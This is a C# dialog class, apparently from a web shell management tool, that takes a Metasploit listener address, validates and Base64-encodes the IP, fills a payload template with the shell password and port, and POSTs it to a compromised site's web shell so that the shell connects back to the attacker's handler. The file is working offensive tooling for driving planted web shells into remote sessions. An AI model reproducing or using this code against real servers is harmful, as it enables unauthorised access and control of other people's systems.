using C2.Controls;
using C2.Core;
using C2.Utils;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class MSFSet : StandardDialog
    {
        private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
        private readonly WebShellTaskConfig task;
        private ProxySetting proxy;
        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
        {
            InitializeComponent();
            task = taskConfig;
            this.proxy = proxy;
            MSF = Global.MSFHost;
        }
        protected override bool OnOKButtonClick()
        {
            if (MSF.IsNullOrEmpty())
            {
                HelpUtil.ShowMessageBox("【MSF地址】不能为空。");
                return false;
            }
            string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
            Match mc = Regex.Match(MSF.Trim(), RegexStr);
            
            if (mc.Groups.Count < 3)
            {
                HelpUtil.ShowMessageBox("【MSF地址】格式有误。");
                return false;
            }
            Global.MSFHost = MSF;
            string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
            string port = mc.Groups[3].Value;
            string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
            Task<string> t = Task.Run(() =>
            WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy));
            return base.OnOKButtonClick();
        }

    }
}
